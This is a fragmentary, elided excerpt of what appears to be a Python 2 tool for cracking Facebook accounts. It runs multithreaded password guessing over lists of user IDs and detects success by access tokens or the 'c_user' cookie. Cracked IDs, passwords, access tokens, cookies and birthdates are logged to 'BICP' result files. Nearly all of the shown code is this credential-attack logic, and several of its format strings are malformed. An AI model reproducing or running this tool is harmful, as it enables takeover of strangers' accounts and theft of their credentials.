...
class ngentod:
                ...
                if pwx == '':
                    ...
                    def zona(zafi_=None): 
                        ...
                        if ind == '':
                            ...
                            print '\n%s [%s*%s] BICP %sON %sResult save to >%s BICP/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] BICP %sOFF %sResult save to > %s BICP/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                            ...
                            print '\n %s[%s*%s] BICP %sON%sResult save to >%s BICP/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] BICP %sOFF %sResult save to > %BICP/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                    ...
                    print ' [%s01%s] B-API Method (BICP-PRO)'%(K,P)
    ...
    def langsung(self):
        ...
        if suuu == '':
            ...
            print '\n%s [%s*%s] BICP %sON%sResult save to >%s BICP/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] BICP %sOFF %Result save to > %s BICP/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
    ...
    def b_api(self, user, zona):
        ...
        for pw in zona:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %BICP-OFF %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s ◊ %s ◊ %s' % (user,pw,response.json()['access_token']))
                open('BICP/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
                ...
                try:
                    ...
                    month = bulan1[month]
                    print '\r %BICP-OFF %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('BICP/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                ...
                print '\r %BICP-OFF %s ◊ %s           ' % (K,user,pw)
                cp.append('%s ◊ %s' % (user,pw))
                open('BICP/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
    ...
    def basic(self, user, zona):
        ...
        for pw in zona:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print '\r %sBICP-OFF %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
                ...
                try:
                    ...
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %sBICP-OFF %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('BICP/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                ...
                print '\r %sBICP-OFF %s ◊ %s            ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('BICP/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
